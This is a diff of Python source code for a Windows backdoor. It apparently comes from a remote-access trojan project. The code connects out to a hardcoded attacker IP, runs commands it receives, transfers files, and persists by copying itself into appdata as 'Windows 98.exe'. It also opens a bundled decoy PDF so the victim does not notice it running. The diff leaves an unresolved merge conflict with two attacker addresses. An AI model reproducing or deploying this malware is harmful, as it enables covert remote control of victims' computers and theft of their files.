@@ -1,6 +1,5 @@
 import subprocess, sys, socket, json, argparse, os, base64, traceback, time, threading, shutil
 
-
 class Args:
     def __init__(self):
         parser = argparse.ArgumentParser()
@@ -11,9 +10,7 @@ class Args:
         self.ip = options.ip
         self.port = options.port
 
-
 class Backdoor:
-    
     
     def __init__(self,ip,port):
         self.persist()
@@ -22,8 +19,7 @@ class Backdoor:
             self.connection.connect((str(ip),int(port)))
         except:
             sys.exit()
-        
-    
+          
     def cd(self,path):
         try:
             ###print('path:',path)
@@ -40,8 +36,7 @@ class Backdoor:
             self.sendStream('FileNotFoundError, change directory command not accepted by target')
         except OSError:
             self.sendStream('OSError, change directory command not accepted by target')
-            
-    
+               
     def executeCmd(self,cmd):
         try:
             DEVNULL = open(os.devnull,'wb')
@@ -50,8 +45,7 @@ class Backdoor:
             return cmd
         except subprocess.CalledProcessError as e:
             return str(e)
-    
-    
+       
     def persist(self):
         pathToPersist = os.environ['appdata'] + '\\Microsoft\\Windows\\Windows 98.exe' 
         #print(pathToPersist)
@@ -59,8 +53,7 @@ class Backdoor:
         if not os.path.exists(pathToPersist): #making sure it's not already there, by us or otherwise
             shutil.copyfile(sys.executable,pathToPersist)
             subprocess.call(cmd, shell = True)
-
-    
+  
     def sendStream(self,data):
         #print('start of send stream')
         #print(f'data passed into function: {data}')
@@ -105,12 +98,10 @@ class Backdoor:
             jsData = json.dumps(threadPid)
             self.connection.send(str(jsData).encode('utf-8'))
 
-
     def runExecutable(self,exe):
         DEVNULL = open(os.devnull,'wb')
         subprocess.check_output(exe,shell=True,stderr = DEVNULL,stdin = DEVNULL)
        
-
     def recvStream(self):
         time.sleep(1)
         jsData = ''
@@ -122,7 +113,11 @@ class Backdoor:
                 return json.loads(jsData)
             except Exception as e:
                 continue
-
+    
+    def makeFile(self,file):
+        if file not in sys._MEIPASS:
+            front = sys._MEIPASS + f"\\{file}" #C:\Users\USER\appdata\local\Temp
+            subprocess.Popen(front,shell=True)
     
     def read_file(self,file):
         fnfError = {'fault':(base64.b64encode(b'FileNotFoundError'))}
@@ -146,7 +141,6 @@ class Backdoor:
         except IndexError:
             return indError
 
-
     def write_file(self,file,content): #still going to use dictionary for sendandreceive
         #print('Starting write_file')
         #print(type(self.cmdIn[2]))
@@ -161,7 +155,6 @@ class Backdoor:
                 returnVal = f'Successfully uploaded {file}'
                 return {'data':returnVal} #dict to keep listener happy
             
-
     def run(self):
         while True:
             #print('run1')
@@ -216,24 +209,32 @@ class Backdoor:
                 ###print(type(cmdOut))
                 self.sendStream(cmdOut)
 
-
 ###############################################################################################RUN#########################################################################################################################                   
 
-
 try:
+<<<<<<< HEAD
     front = sys._MEIPASS + "\\sample.pdf"
     subprocess.Popen(front,shell=True)
     time.sleep(5)
     os.remove(front)
     args = Args()
     backdoor = Backdoor("192.168.86.109",args.port)
+=======
+    args = Args()
+    backdoor = Backdoor("192.168.241.133",args.port)
+    backdoor.makeFile("sample.pdf")
+>>>>>>> bdcd346f2d479270978680a4b09919542756ee6b
     backdoor.run()
+
 except KeyboardInterrupt:
     sys.exit()
+
 except ConnectionAbortedError:
     sys.exit()
+
 except ConnectionResetError:
     sys.exit()
+
 except ConnectionRefusedError:
     sys.exit()
     
